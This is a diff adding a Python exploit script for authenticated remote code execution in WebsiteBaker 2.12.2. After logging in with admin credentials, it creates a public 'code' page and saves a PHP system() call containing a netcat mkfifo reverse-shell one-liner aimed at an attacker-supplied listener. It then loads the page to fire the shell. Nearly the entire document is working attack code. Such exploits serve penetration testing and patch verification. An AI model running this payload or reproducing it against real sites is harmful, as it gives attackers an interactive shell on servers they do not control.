@@ -1,0 +1,108 @@
+# Exploit Title: WebsiteBaker 2.12.2 - Remote Code Execution
+# Date: 2020-07-04
+# Exploit Author: Selim Enes 'Enesdex' Karaduman
+# Vendor Homepage: https://websitebaker.org/pages/en/home.php
+# Software Link: https://wiki.websitebaker.org/doku.php/downloads
+# Version: 2.12.2
+# Tested on: Windows 10 and Ubuntu 18.04 
+# Note : You start listener before execute (e.g netcat) then procide listener ip and port
+
+import requests
+import re
+from bs4 import BeautifulSoup
+import sys
+import getopt
+
+options, remainder = getopt.gnu_getopt(sys.argv[1:], 'ht:u:p:i:l:',['lhost=','lport='])
+
+for opt, arg in options:
+    if opt in ('-h'): 
+        print('Usage: python exploit.py -t TARGET_URL -u USERNAME -p PASSWORD --lhost LISTENER_IP --lport LISTENER_PORT')
+        exit()
+    elif opt in ('-t'):
+        main_url = arg
+    elif opt in ('-u'):
+        usr = arg
+    elif opt in ('-p'):
+        passwd = arg
+    elif opt in ('-i', '--lhost'):
+    	lhost = arg
+    elif opt in ('-l' , '--lport'):
+    	lport = arg
+
+reverse_shell_code = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc"+" "+lhost+" "+lport +" "+">/tmp/f"
+shell_code_eval = "echo system('"+ reverse_shell_code + "');"
+
+
+print("Exploit Author: Selim Enes 'Enesdex' Karaduman" + " " + "@enesdex" + "\n")
+##LOGIN PAGE HTML PARSE FOR LOGIN PARAMS
+url = main_url+"/admin/login/index.php"
+req = requests.get(url)
+
+login_page = req.text
+soup = BeautifulSoup(login_page, 'html.parser')
+username_par = soup.find_all(attrs={"type" : "hidden"})[1]['value']
+password_par = soup.find_all(attrs={"type" : "hidden"})[2]['value']
+weird_par = soup.find_all(attrs={"type" : "hidden"})[3]['name']
+weird_val = soup.find_all(attrs={"type" : "hidden"})[3]['value']
+
+#LOGIN TO GET SESSIoN_COOKIE
+login_page = requests.Session()
+
+burp0_url = main_url+"/admin/login/index.php"
+burp0_headers = {"Content-Type": "application/x-www-form-urlencoded"}
+burp0_data = {"url": '', "username_fieldname": username_par, "password_fieldname": password_par, weird_par : weird_val, username_par : usr,  password_par : passwd, "submit": ''}
+r = login_page.post(burp0_url, headers=burp0_headers, data=burp0_data,allow_redirects = False)
+
+cok = r.headers['Set-Cookie']
+cok = cok.split(' ')[0]  
+cookie_par = cok.split('=')[0]
+cookie_val = cok.split('=')[1].replace(';','')
+session_cookie = cookie_par + "=" + cookie_val
+
+
+##ADD PAGE HTML PARSE FOR CREATE PAGE PARAMS
+url = main_url+"/admin/pages/index.php"
+cookies = {cookie_par : cookie_val}
+req = requests.get(url, cookies=cookies)
+create_page = req.text
+soup = BeautifulSoup(create_page, 'html.parser')
+weird_par1 = soup.find_all(attrs={"type" : "hidden"})[0]['name']
+weird_val1 = soup.find_all(attrs={"type" : "hidden"})[0]['value']
+
+##Create Code Page to Put Shell Code
+create_page = requests.session()
+
+burp0_url = main_url+"/admin/pages/add.php"
+burp0_cookies = {cookie_par : cookie_val}
+burp0_headers = {"Content-Type": "application/x-www-form-urlencoded"}
+burp0_data = {weird_par1: weird_val1, "title": "exploit-shell", "type": "code", "parent": "0", "visibility": "public", "submit": "Add"}
+c = create_page.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+
+##FIND THE PAGE ID
+url = main_url+"/admin/pages/index.php"
+cookies = {cookie_par : cookie_val}
+req = requests.get(url, cookies=cookies)
+find_id = req.text
+soup = BeautifulSoup(find_id, 'html.parser')
+pageid = soup.find_all('option',string='exploit-shell')[0]['value']
+
+##HTML PARSE TO PUT SHELL CODE
+url = main_url+'/admin/pages/modify.php?page_id='+pageid
+cookies = {cookie_par : cookie_val}
+req = requests.get(url, cookies=cookies)
+add_shellcode = req.text
+soup = BeautifulSoup(add_shellcode, 'html.parser')
+weird_par2 = soup.find_all(attrs={"type" : "hidden"})[3]['name']
+weird_val2 = soup.find_all(attrs={"type" : "hidden"})[3]['value']
+
+##ADD SHELL CODE
+session = requests.session()
+
+burp0_url = main_url+"/modules/code/save.php"
+burp0_cookies = {cookie_par : cookie_val}
+burp0_headers = {"Content-Type": "application/x-www-form-urlencoded"}
+burp0_data = {"page_id": pageid, "section_id": pageid, weird_par2: weird_val2, "content": shell_code_eval}
+a = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+
+last_req = requests.get(main_url+"/pages/exploit-shell.php", cookies=cookies)
